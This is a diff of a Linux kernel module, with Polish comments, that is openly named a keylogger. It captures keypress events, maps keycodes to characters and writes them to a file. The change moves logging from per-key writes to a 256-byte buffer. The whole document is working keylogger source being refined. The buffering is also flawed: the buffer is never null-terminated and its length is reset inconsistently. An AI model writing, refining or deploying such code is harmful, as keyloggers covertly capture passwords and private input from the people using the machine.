@@ -15,6 +15,9 @@ static struct input_handler keylogger_handler;
 static struct file *file = NULL;
 static struct mutex keylog_mutex;  // Mutex do synchronizacji zapisów
 
+static char log_buffer[256];  // Bufor na naciśnięte klawisze
+static int buffer_len = 0;
+
 // Funkcja do mapowania kodu klawisza na znak
 static char keycode_to_char(unsigned int code) {
     if (code >= KEY_1 && code <= KEY_9) {
@@ -35,29 +38,20 @@ static char keycode_to_char(unsigned int code) {
     return '\0';  // Zwróć pusty znak, jeśli klawisz nie jest obsługiwany
 }
 
-// Funkcja zapisująca naciśnięty klawisz do pliku
-static void log_key_to_file(char key) {
-    char log_entry[64];
-    int len;
-
-    if (key == '\0')  // Ignorujemy nieobsługiwane klawisze
-        return;
-
-    len = snprintf(log_entry, sizeof(log_entry), "%c", key);
-
-    // Zabezpieczamy dostęp do pliku mutexem
-    mutex_lock(&keylog_mutex);
-
-    // Sprawdzamy, czy plik jest otwarty
-    if (file) {
-        if (kernel_write(file, log_entry, len, &file->f_pos) < 0) {
-            printk(KERN_ERR "Failed to write to the file\n");
+// Funkcja zapisująca naciśnięte klawisze do pliku
+static void log_key_to_file(void) {
+    if (buffer_len > 0) {
+        mutex_lock(&keylog_mutex);
+        
+        // Zabezpieczamy dostęp do pliku
+        if (file) {
+            int len = strlen(log_buffer);
+            kernel_write(file, log_buffer, len, &file->f_pos);
+            buffer_len = 0;  // Czyszczenie bufora po zapisie
         }
-    } else {
-        printk(KERN_ERR "File is not open\n");
+        
+        mutex_unlock(&keylog_mutex);  // Zwolnienie mutexa
     }
-
-    mutex_unlock(&keylog_mutex);  // Zwolnienie mutexa
 }
 
 // Funkcja obsługująca zdarzenie naciśnięcia klawisza
@@ -65,7 +59,14 @@ static void keylogger_event(struct input_handle *handle, unsigned int type, unsi
     if (type == EV_KEY && value == 1) {  // Zdarzenie naciśnięcia klawisza
         printk(KERN_INFO "Key pressed: %u\n", code);
         char key = keycode_to_char(code);  // Mapowanie kodu na znak
-        log_key_to_file(key);  // Zapisz znak do pliku
+        if (key != '\0') {
+            // Dodajemy klawisz do bufora
+            log_buffer[buffer_len++] = key;
+            if (buffer_len >= sizeof(log_buffer) - 1) {
+                buffer_len = 0;  // Zresetuj bufor, jeśli jest pełny
+            }
+            log_key_to_file();  // Zapisz do pliku
+        }
     }
 }
 
